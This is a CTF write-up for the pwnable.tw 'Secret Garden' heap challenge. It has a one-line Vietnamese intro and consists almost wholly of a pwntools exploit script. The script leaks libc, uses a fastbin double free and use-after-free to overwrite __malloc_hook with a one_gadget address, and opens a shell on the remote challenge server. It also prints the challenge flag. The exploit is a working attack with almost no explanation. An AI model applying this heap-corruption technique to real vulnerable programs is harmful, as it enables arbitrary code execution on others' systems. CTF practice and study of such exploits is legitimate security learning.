1 chall đơn giản sử dụng kĩ thuật UAF và DBF 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./secretgarden_patched")
libc = ELF("./libc_64.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe
p = process([exe.path])
p = remote('chall.pwnable.tw',10203)
def GDB():
    gdb.attach(p, gdbscript = '''
    b*0x555555400000+0x0000000000000CD3
    b*0x555555400000+0x0000000000000C65
    b*0x555555400000+0x0000000000000E74
    b*0x555555400000+0x0000000000000F8B
    c
    ''')
    input()

def add(size, data, color):
    p.sendlineafter(b'choice : ', b'1')
    p.sendlineafter(b'name :', str(size))
    p.sendafter(b'flower :', data)
    p.sendlineafter(b'flower :', color)

def show():
    p.sendlineafter(b'choice : ', b'2')

def delete(idx):
    p.sendlineafter(b'choice : ', b'3')
    p.sendlineafter(b'garden:', str(idx))

# leak libc
add(0x500, b'aaaa', b'bbbb') # 0
add(0x500, b'aaaa', b'bbbb') # 1
delete(0)
add(0x100, b'a', b'b') # 2
show() 
p.recvuntil(b'Name of the flower[2] :')
libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - 0x3c3b61
print(hex(libc.address))
# p.sendlineafter(b'choice : ', b'4')

# DBF
add(0x60, b'aaaa', b'bbbb') 
add(0x60, b'aaaa', b'bbbb')
add(0x60, b'/bin/sh\0', b'bbbb') # 5

delete(3)
delete(4)
delete(3)

# UAF
add(0x60, p64(libc.sym.__malloc_hook - 35), b'bbbb') 
add(0x60, b'a', b'bbbb')
show()
p.recvuntil(b'Name of the flower[7] :')
heap = u64(p.recv(6) + b'\0\0')
print(hex(heap))
need = heap + 0x19f
# GDB() 0x4526a 0xef6c4 0xf0567
one_gadget = libc.address + 0xef6c4
add(0x60, b'aaaa', b'bbbb')
add(0x60, b'\0' * 19 + p64(one_gadget), b'bbbb')
# p.sendlineafter(b'choice : ', b'1')
# # p.sendlineafter(b'name :', str(need))

# Trigger aborted
delete(5)
delete(5)

p.interactive()

# FLAG{FastBiN_C0rruption_t0_BUrN_7H3_G4rd3n}
```
![image](https://github.com/gookoosss/CTF/assets/128712571/349b0421-bcb5-4e69-b57b-129d213f2789)
